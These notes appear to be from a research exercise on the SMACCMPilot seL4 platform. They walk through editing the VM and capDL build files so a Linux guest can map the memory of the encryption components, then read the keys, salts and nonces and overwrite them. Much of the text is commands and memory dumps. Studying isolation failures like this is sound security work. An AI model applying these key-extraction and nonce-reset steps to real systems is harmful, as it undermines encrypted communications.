These notes describe how the attack is constructed


Modifying the VM
================

The goal is to overwrite the nonce and salt for the encryption and
decryption functions. We accomplish this by mapping the relevant pages
of memory into the memory space of the VM. First we modify the VM to
tell it that we are inserting two extra pages to be loaded at a
specific memory address (we picked `0x8000000` somewhat arbitrarily).
To tell the VM this, we modify the file
`apps/smaccmpilot/components/camera_vm/camera_vm.camkes`. Find the two
lines at the bottom that look like this:

```
vm.num_extra_frame_caps = 0;
vm.extra_frame_map_address = 0;
```

and change them to

```
vm.num_extra_frame_caps = 2;
vm.extra_frame_map_address = 0x80000000;
```

Then recompile the Ordoid image.


Modifying the capDL file
========================

First we need to locate the memory where encryption information is
stored. The relevant data is in `build/arm/exynos5/smaccmpilot` in the
binaries:

  - `commsecDecodeState_inst_group_bin`
  - `commsecEncodeState_inst_group_bin`

We start by looking at the memory for the decoder:
```
arm-none-eabi-objdump -Dlx commsecDecodeState_inst_group_bin
```

The crypto information is stored in the C variable
`ctx_dl_2_global_gec_sym_key_dec` which we can locate in the symbol
table from objdump:

```
0022fa58 l     O .bss   00001128 ctx_dl_2_global_gec_sym_key_dec
```

This means the variable will be at the virtual memory address
`0x0022fa58`. That means it's at offset `0xa58` in page `0x22f`. But,
this variable points to a rather large structure and it turns out the
information we want will actually spill on to the next page. So we
want to map page `0x230` into the VM memory space.

To do this we modify the `smaccmpilot.cdl` file located in the same
directory as the binaries. Here we find the page table for
`commsecDecodeState_inst_group_bin`:

```
pd_commsecDecodeState_inst_group_bin {
0x0: pt_commsecDecodeState_inst_group_bin_0
0x1: pt_commsecDecodeState_inst_group_bin_1
}
```

Each page table represents 2mb so the page table at 0x1 has entries
for addresses in the 0x2000000 - 0x4000000 range which covers the
address we are interested in (0x2300000). In particular, we want to
find the frame mapped at `0x30` in that page table:

```
pt_commsecDecodeState_inst_group_bin_1 {
...
0x30: frame_commsecDecodeState_inst_group_bin_192 (RWX)
...
}
```

First we need to mark this page as uncached since the Linux VM treats
it as uncached. We do this by adding the `uncached` attribute:

```
pt_commsecDecodeState_inst_group_bin_1 {
...
0x30: frame_commsecDecodeState_inst_group_bin_192 (RWX, uncached)
...
}
```

Then, we need to insert this frame into the cnode for the vm. We need
to leave one empty cnode and then place it in the next available slot:

```
cnode_vm {
...
0x133: vm_irq_109
0x134: vm_irq_103
0x136: frame_commsecDecodeState_inst_group_bin_192 (RWX)
```

We now repeat this process for commsecEncodeState_inst_group_bin:

```
arm-none-eabi-objdump -Dlx commsecEncodeState_inst_group_bin
```

The relevant variable is `ctx_dl_global_gec_sym_key_enc` which we can
find in the symbol table:

```
0022ea58 l     O .bss   00001128 ctx_dl_global_gec_sym_key_enc
```

The virtual memory address is `0x22ea58` which is page `0x22e` with
offset `0xa58`. Again the information we actually want will spill onto
the next page at `0x22f`. Looking at the page table:

```
pd_commsecEncodeState_inst_group_bin {
0x0: pt_commsecEncodeState_inst_group_bin_0
0x1: pt_commsecEncodeState_inst_group_bin_1
}
```

We see that we want offset `0x2f` in `pt_commsecEncodeState_inst_group_bin_1` which is:

```
pt_commsecEncodeState_inst_group_bin_1 {
...
0x2f: frame_commsecEncodeState_inst_group_bin_217 (RWX)
...
}
```

First we mark this as `uncached`:

```
pt_commsecEncodeState_inst_group_bin_1 {
...
0x2f: frame_commsecEncodeState_inst_group_bin_217 (RWX, uncached)
...
}
```

We then add this to the VM's cnode:

```
cnode_vm {
...
0x133: vm_irq_109
0x134: vm_irq_103
0x136: frame_commsecDecodeState_inst_group_bin_192 (RWX)
0x137: frame_commsecEncodeState_inst_group_bin_217 (RWX)
```

Now we want to recompile with this new cdl file. To force the build
tool to use it, we need to remove the existing C file that is
generated from this cdl file:

```
rm build/arm/exynos5/capdl-loader-experimental/src/capdl_spec.c
```

Now build the Odroid image again and ensure that our modifications to
the cdl file have not been overwritten by the build tool. If they
have, then make them again, delete the `capdl_spec.c` file, and try
again.


Finding the key, salt, and nonce in the VM
==========================================

Now we can boot the Odroid and try to locate the key, salt, and nonce
for both the encoder and decoder. Within the VM, the pages we mapped
in are available at the memory range 0x80000000 - 0x8002000. Ihor has
provided the rw_mem.c tool in this repository which we can use to read
and modify memory.

First we can locate the keys since we know exactly what they are. To
read the memory we mapped in, do:

```
make read
```

And searching for the keys finds

```
0x80000aa0: 0xfe 0x45 0x2e 0x54 0x20 0xbf 0xb4 0x21 0x18 0x17 0x16 0x15 0x14 0x13 0x12 0x11 
0x80000ab0: 0x10 0x0f 0x0e 0x0d 0x0c 0x0b 0x0a 0x09 0x32 0x70 0x17 0xeb 0x26 0x63 0x05 0xfa
...
0x80001aa0: 0x59 0x71 0x2b 0xaf 0xcf 0xf2 0xab 0x24 0x01 0x02 0x03 0x04 0x05 0x06 0x07 0x08 
0x80001ab0: 0x09 0x0a 0x0b 0x0c 0x0d 0x0e 0x0f 0x10 0xab 0x74 0xc9 0xd3 0xae 0x72 0xce 0xdb
```

Thus the keys are at 0x80000aa8 and 0x80001aa8. A make target is
available to read these keys:

```
root@odroid-jessie:~/hack# make read-keys
./rw_mem -a 0x80000aa8 -s 16
0x80000aa8: 0x18 0x17 0x16 0x15 0x14 0x13 0x12 0x11 0x10 0x0f 0x0e 0x0d 0x0c 0x0b 0x0a 0x09 
./rw_mem -a 0x80001aa8 -s 16
0x80001aa8: 0x01 0x02 0x03 0x04 0x05 0x06 0x07 0x08 0x09 0x0a 0x0b 0x0c 0x0d 0x0e 0x0f 0x10
```

We can also find the salts by searching for them directly:

```
0x80000b60: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x08 0x07 0x06 0x05
0x80000b70: 0x04 0x03 0x02 0x01 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
...
0x80001b60: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x11 0x12 0x13 0x14
0x80001b70: 0x15 0x16 0x17 0x18 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
```

Thus the salts are at 0x80000b6c and 0x80001b6c. A make target is
available to read these salts:

```
root@odroid-jessie:~/hack# make read-salts
./rw_mem -a 0x80000b6c -s 8
0x80000b6c: 0x08 0x07 0x06 0x05 0x04 0x03 0x02 0x01 
./rw_mem -a 0x80001b6c -s 8
0x80001b6c: 0x11 0x12 0x13 0x14 0x15 0x16 0x17 0x18 
```

Finding the nonces is tricker because they are initially all zero so
we can't just search for them. Instead we save the results of `make
read` over several requests to the odroid and diff the resulting files
to find the nonce. After doing 283 requests we can find the nonces here:


```
0x80000b70: 0x04 0x03 0x02 0x01 0x00 0x00 0x00 0x00 0x00 0x1b 0x01 0x00 0x00 0x00 0x00 0x00
0x80000b80: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
...
0x80001b70: 0x15 0x16 0x17 0x18 0x00 0x00 0x00 0x00 0x1b 0x01 0x00 0x00 0x00 0x00 0x00 0x00
0x80001b80: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
```

The nonce is a uint64 stored in little endian format. The nonces are
at 0x80000b79 and 0x80001b78. A make target is available to read these
nonces:

```
root@odroid-jessie:~/hack# make read-nonces 
./rw_mem -a 0x80000b79 -s 8
0x80000b79: 0x1b 0x01 0x00 0x00 0x00 0x00 0x00 0x00 
./rw_mem -a 0x80001b79 -s 8
0x80001b78: 0x1b 0x01 0x00 0x00 0x00 0x00 0x00 0x00
```

Now the attack simply overwrites the salts with the attacker's salts
(all zeros) and resets the nonces to zero so that the attacker can
syncronize with the Odroid. A make target is available to do these
overwrites:

```
root@odroid-jessie:~/hack# make hack
./rw_mem -a 0x80000b6c -s 8 -w -h 0x00
./rw_mem -a 0x80001b6c -s 8 -w -h 0x00
./rw_mem -a 0x80000b79 -s 8 -w -h 0x00
./rw_mem -a 0x80001b79 -s 8 -w -h 0x00
```

Due to caching this often doesn't actually work. The workaround is to
run `make clean hack`. The recompiling seems to resolve the cache
issues.
